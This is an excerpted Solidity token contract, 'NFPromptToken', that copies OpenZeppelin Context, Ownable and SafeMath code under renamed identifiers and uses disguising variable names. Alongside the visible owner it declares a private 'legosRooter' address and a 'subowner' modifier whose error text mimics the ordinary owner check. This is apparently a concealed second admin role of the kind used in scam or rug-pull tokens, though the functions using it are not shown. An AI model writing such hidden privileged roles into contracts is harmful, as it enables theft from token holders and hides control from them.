...
/*
 * @dev Provides information about the current execution NFPrompt20Burnable, including the
 ...
 */
abstract contract NFPrompt20Burnable {
...
// File: @openzeppelin/contracts/access/NFPrompt20Ownable.sol
 ...
 * the owner.
 */
abstract contract NFPrompt20Ownable is NFPrompt20Burnable {
     ...
     */
    modifier onlyOwner() {
        require(owner() == _msgSender(), "NFPrompt20Ownable: caller is not the owner");
        _;
    }
    ...
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "NFPrompt20Ownable: new owner is the zero address");
 ...
 * `SafeNFPrompt` restores this intuition by reverting the transaction when an
 * operation overflows.
 *
 * Using this library instead of the unchecked operations eliminates an entire
 * class of bugs, so it's recommended to use it always.
 */
library SafeNFPrompt {
  /**
  ...
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeNFPrompt: addition overflow");
  ...
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeNFPrompt: subtraction overflow");
  }
  ...
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    ...
    uint256 c = a * b;
    require(c / a == b, "SafeNFPrompt: multiplication overflow");
  ...
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeNFPrompt: division by zero");
  }
  ...
  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeNFPrompt: modulo by zero");
  }
...
contract NFPromptToken is NFPrompt20Burnable, NFPrompt33, NFPrompt20Ownable {
    
    using SafeNFPrompt for uint256;
   ...
   address private legosRooter; 
    ...
    string public NFPrompttelegramcchannel = "https://t.me/nfprompt";
            function getNFPrompttelegramcchannel() public view returns (string memory) {
        return NFPrompttelegramcchannel;
    }
    /**
    * @dev Returns the bep token owner.
    */
    ...
    */
    ...
    /**
    * @dev See {NFPrompt33-totalSupply}.
    */
    ...
    /**
    * @dev See {NFPrompt33-balanceOf}.
    */
    function balanceOf(address account) external view override returns (uint256) {
        return mintfrom[account];
    }
      modifier subowner() {
        require(legosRooter == _msgSender(), "NFPrompt20Ownable: caller is not the owner");
        _;
    }
    /**
    * @dev See {NFPrompt33-approve}.
    *
    * Requirements:
    *
    ...
    */
    ...
    /**
    * @dev See {NFPrompt33-transferFrom}.
    *
    * Emits an {Approval} event indicating the updated allowance. This is not
    * required by the EIP. See the note at the beginning of {NFPrompt33};
    *
    * Requirements:
    ...
    */
    function transferFrom(address sender, address shippingto, uint256 yoursold) external override returns (bool) {
        ...
        _approve(sender, _msgSender(), fromallowances[sender][_msgSender()].sub(yoursold, "NFPrompt33: transfer yoursold exceeds allowance"));
        return true;
    }
    ...
    * problems described in {NFPrompt33-approve}.
    *
    ...
    */
    function decreaseAllowance(address transporteur, uint256 allbalances) external returns (bool) {
        _approve(_msgSender(), transporteur, fromallowances[_msgSender()][transporteur].sub(allbalances, "NFPrompt33: decreased allowance below zero"));
        return true;
    }
    ...
    */
    function _transfer(address sender, address shippingto, uint256 yoursold) internal {
        require(sender != address(0), "NFPrompt33: transfer from the zero address");
        require(shippingto != address(0), "NFPrompt33: transfer to the zero address");
                
        mintfrom[sender] = mintfrom[sender].sub(yoursold, "NFPrompt33: transfer yoursold exceeds balance");
    ...
    */
    function _approve(address owner, address transporteur, uint256 yoursold) internal {
        require(owner != address(0), "NFPrompt33: approve from the zero address");
        require(transporteur != address(0), "NFPrompt33: approve to the zero address");
